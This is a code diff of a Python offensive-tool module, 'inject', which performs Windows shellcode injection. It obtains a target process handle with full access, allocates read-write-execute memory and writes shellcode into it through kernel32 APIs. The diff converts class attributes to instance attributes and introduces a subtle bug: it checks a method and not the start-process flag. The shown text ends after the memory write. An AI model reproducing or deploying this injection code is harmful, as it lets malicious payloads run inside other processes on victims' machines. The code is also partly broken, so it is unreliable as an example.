@@ -14,10 +14,16 @@ class inject:
 
     Author = 'cpu0x00'
     Description = 'Inject shellcode to process'
-    Version = '1.0.0'
-    Target_Process = ''
-    Shellcode = ''
-    StartProcess = False
+    Version = '1.1.0'
+    # Target_Process = ''
+    # Shellcode = ''
+    # StartProcess = False
+
+    def __init__(self, input_file, process_start, target_process, shellcode):
+        self.input_file = input_file
+        self.process_start = process_start
+        self.target_process = target_process
+        self.shellcode = shellcode
 
     def init():
         spName = 'inject'
@@ -28,16 +34,16 @@ class inject:
             ]
         utils.arg.CreateSubParser(spName, inject.Description, spArgList)
 
-    def Start_Process():
-        tp = inject.Target_Process
+    def Start_Process(self):
+        tp = self.target_process
         print(f'{nstate.OKBLUE} starting {tp}')
         os.system(tp)
 
-    def get_proc_id():
-        processes = inject.wmi.WMI().Win32_Process(name=inject.Target_Process)
+    def get_proc_id(self):
+        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         
         pid = processes[0].ProcessId
-        print(f"{nstate.OKGREEN} {inject.Target_Process} process id: {pid}")
+        print(f"{nstate.OKGREEN} {self.target_process} process id: {pid}")
         
         return int(pid)
     
@@ -47,12 +53,12 @@ class inject:
     # if shellcode:
     #   print(f'[*] retrieved the shellcode from {args.server}')
 
-    def start_injection():
-        if inject.StartProcess:
-            s = inject.threading.Thread(target=inject.Start_Process)
+    def start_injection(self):
+        if self.Start_Process:
+            s = self.threading.Thread(target=self.Start_Process)
             s.start()
-            inject.sleep(3)
-        kernel32 = inject.windll.kernel32
+            self.sleep(3)
+        kernel32 = self.windll.kernel32
         # constants
         MEM_COMMIT_RESERVE = 0x3000
         PAGE_READWRITE_EXECUTE = 0x40
@@ -61,36 +67,36 @@ class inject:
 
         # Function type redefintions
         OpenProcess = kernel32.OpenProcess
-        OpenProcess.argtypes = [inject.wintypes.DWORD,inject.wintypes.BOOL,inject.wintypes.DWORD]
-        OpenProcess.restype = inject.wintypes.HANDLE
+        OpenProcess.argtypes = [self.wintypes.DWORD,self.wintypes.BOOL,self.wintypes.DWORD]
+        OpenProcess.restype = self.wintypes.HANDLE
 
         VirtualAllocEx = kernel32.VirtualAllocEx
-        VirtualAllocEx.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.DWORD,inject.wintypes.DWORD]
-        VirtualAllocEx.restype = inject.wintypes.LPVOID
+        VirtualAllocEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD,self.wintypes.DWORD]
+        VirtualAllocEx.restype = self.wintypes.LPVOID
 
         WriteProcessMemory = kernel32.WriteProcessMemory
-        WriteProcessMemory.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, inject.wintypes.LPCVOID, ctypes.c_size_t, inject.wintypes.LPVOID]
-        WriteProcessMemory.restype = inject.wintypes.BOOL
+        WriteProcessMemory.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, self.wintypes.LPCVOID, ctypes.c_size_t, self.wintypes.LPVOID]
+        WriteProcessMemory.restype = self.wintypes.BOOL
 
         CreateRemoteThread = kernel32.CreateRemoteThread
-        CreateRemoteThread.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.LPVOID, inject.wintypes.LPVOID, inject.wintypes.DWORD, inject.wintypes.LPDWORD]
-        CreateRemoteThread.restype = inject.wintypes.HANDLE
+        CreateRemoteThread.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.LPVOID, self.wintypes.LPVOID, self.wintypes.DWORD, self.wintypes.LPDWORD]
+        CreateRemoteThread.restype = self.wintypes.HANDLE
 
         CloseHandle = kernel32.CloseHandle
-        CloseHandle.argtypes = [inject.wintypes.HANDLE]
-        CloseHandle.restype = inject.wintypes.BOOL
-        process_id = inject.get_proc_id()
+        CloseHandle.argtypes = [self.wintypes.HANDLE]
+        CloseHandle.restype = self.wintypes.BOOL
+        process_id = self.get_proc_id()
 
         phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
         if phandle:
             print(f"{nstate.OKGREEN} Opened a Handle to the process")
 
-        memory = VirtualAllocEx(phandle, None, len(inject.Shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
+        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if memory:
             print(f'{nstate.OKGREEN} Allocated Memory in the process')
 
         c_null = ctypes.c_int(0)
-        writing = WriteProcessMemory(phandle, memory, inject.Shellcode, len(inject.Shellcode), ctypes.byref(c_null))
+        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), ctypes.byref(c_null))
         if writing:
             print(f'{nstate.OKGREEN} Wrote The shellcode to memory')
 
